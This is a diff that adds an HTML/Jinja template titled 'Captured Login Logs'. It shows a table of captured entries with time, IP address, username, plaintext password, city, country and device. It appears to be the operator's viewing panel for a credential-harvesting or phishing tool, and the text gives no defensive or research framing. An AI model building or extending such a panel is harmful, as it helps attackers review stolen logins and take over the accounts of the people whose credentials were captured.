@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Login Logs</title>
+  <style>
+    table { width: 100%; border-collapse: collapse; }
+    th, td { border: 1px solid #ccc; padding: 8px; text-align: left; }
+    th { background-color: #f2f2f2; }
+  </style>
+</head>
+<body>
+  <h2>Captured Login Logs</h2>
+  <table>
+    <tr>
+      <th>Time</th><th>IP</th><th>Username</th><th>Password</th><th>City</th><th>Country</th><th>Device</th>
+    </tr>
+    {% for entry in entries %}
+    <tr>
+      <td>{{ entry.time }}</td>
+      <td>{{ entry.ip }}</td>
+      <td>{{ entry.username }}</td>
+      <td>{{ entry.password }}</td>
+      <td>{{ entry.city }}</td>
+      <td>{{ entry.country }}</td>
+      <td>{{ entry.ua }}</td>
+    </tr>
+    {% endfor %}
+  </table>
+</body>
+</html>
